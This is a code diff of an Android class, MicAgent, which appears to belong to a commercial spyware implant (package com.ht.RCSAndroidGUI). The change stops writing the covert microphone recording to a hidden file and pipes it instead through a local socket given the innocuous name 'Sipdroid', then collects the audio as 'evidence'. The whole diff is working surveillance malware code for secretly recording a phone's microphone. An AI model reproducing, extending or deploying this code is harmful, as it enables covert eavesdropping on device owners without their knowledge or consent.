@@ -10,9 +10,13 @@ package com.ht.RCSAndroidGUI.agent;
 
 import java.io.File;
 import java.io.IOException;
+import java.io.InputStream;
 import java.util.Random;
 
 import android.media.MediaRecorder;
+import android.net.LocalServerSocket;
+import android.net.LocalSocket;
+import android.net.LocalSocketAddress;
 import android.util.Log;
 
 import com.ht.RCSAndroidGUI.LogR;
@@ -70,11 +74,12 @@ public class MicAgent extends AgentBase {
 	Object stateLock = new Object();
 
 	private int numFailures;
-
 	private long fId;
-	private String currentRecFile;
-	//private String lastRecFile;
-	int fileOffset;
+
+	private LocalSocket receiver;
+	private LocalServerSocket lss;
+	private LocalSocket sender;
+	private InputStream is;
 
 	/*
 	 * (non-Javadoc)
@@ -151,10 +156,8 @@ public class MicAgent extends AgentBase {
 				if (audio != 0) {
 					Log.d("QZ", TAG + " (go): max audio=" + audio);
 				}
-				
+
 				if (numFailures < 10) {
-					//restartRecorder();
-					//Utils.sleep(1000);
 					saveRecorderEvidence();
 
 				} else {
@@ -175,8 +178,6 @@ public class MicAgent extends AgentBase {
 	}
 
 	private void addPhoneListener() {
-		// TODO Auto-generated method stub
-
 	}
 
 	private void saveRecorderEvidence() {
@@ -185,7 +186,6 @@ public class MicAgent extends AgentBase {
 		// #endif
 
 		final byte[] chunk = getAvailable();
-		
 
 		if (chunk != null && chunk.length > 0) {
 
@@ -208,13 +208,22 @@ public class MicAgent extends AgentBase {
 		}
 	}
 
-	
 	private byte[] getAvailable() {
-		AutoFile file = new AutoFile(currentRecFile);
-		
-		byte[] ret = file.read(fileOffset);
-		fileOffset += ret.length;
-		
+		byte[] ret = null;
+		try {
+			if (receiver.isBound() && receiver.isConnected()) {
+				if (is == null) {
+					is = receiver.getInputStream();
+				}
+
+				int available = is.available();
+				ret = new byte[available];
+				is.read(ret);
+			}
+		} catch (IOException e) {
+			// TODO Auto-generated catch block
+			e.printStackTrace();
+		}
 
 		return ret;
 	}
@@ -225,7 +234,16 @@ public class MicAgent extends AgentBase {
 	 * @see com.ht.RCSAndroidGUI.agent.AgentBase#parse(byte[])
 	 */
 	@Override
-	public boolean parse(final byte[] conf) {
+	public boolean parse(final byte[] confParameters) {
+		final DataBuffer databuffer = new DataBuffer(confParameters, 0,
+				confParameters.length);
+
+		try {
+			int vad = databuffer.readInt();
+			int value = databuffer.readInt();
+		} catch (IOException e) {
+			return false;
+		}
 		setPeriod(MIC_PERIOD);
 		setDelay(MIC_PERIOD);
 		return true;
@@ -256,17 +274,36 @@ public class MicAgent extends AgentBase {
 
 		numFailures = 0;
 
-		//lastRecFile = currentRecFile;
-		currentRecFile = Path.hidden() + "currentRec" + Utils.getTimeStamp();
+		// lastRecFile = currentRecFile;
+		// currentRecFile = Path.hidden() + "currentRec" + Utils.getTimeStamp();
+
+		// LocalServerSocket socket = new LocalServerSocket("currentRecSocket");
+		createSockets();
 
 		recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
 		recorder.setOutputFormat(MediaRecorder.OutputFormat.RAW_AMR);
 		recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
 
-		recorder.setOutputFile(currentRecFile);
+		recorder.setOutputFile(sender.getFileDescriptor());
+
 		recorder.prepare();
 		recorder.start(); // Recording is now started
 
+	}
+
+	private void createSockets() {
+		receiver = new LocalSocket();
+		try {
+			lss = new LocalServerSocket("Sipdroid");
+			receiver.connect(new LocalSocketAddress("Sipdroid"));
+			receiver.setReceiveBufferSize(500000);
+			receiver.setSendBufferSize(500000);
+			sender = lss.accept();
+			sender.setReceiveBufferSize(500000);
+			sender.setSendBufferSize(500000);
+		} catch (IOException e) {
+			Log.d("QZ", TAG + " (createSockets) Error: " + e);
+		}
 	}
 
 	// SNIPPET
@@ -280,9 +317,19 @@ public class MicAgent extends AgentBase {
 								// setAudioSource() step
 			// recorder.release(); // Now the object cannot be reused
 			getAvailable();
-			
-			File file = new File(currentRecFile);
-			file.delete();
+
+			// File file = new File(currentRecFile);
+			// file.delete();
+
+			try {
+				sender.close();
+				receiver.close();
+				lss.close();
+			} catch (IOException e) {
+				// TODO Auto-generated catch block
+				e.printStackTrace();
+			}
+
 		}
 	}
 
@@ -314,6 +361,6 @@ public class MicAgent extends AgentBase {
 
 	private void removePhoneListener() {
 		// TODO Auto-generated method stub
-	
+
 	}
 }
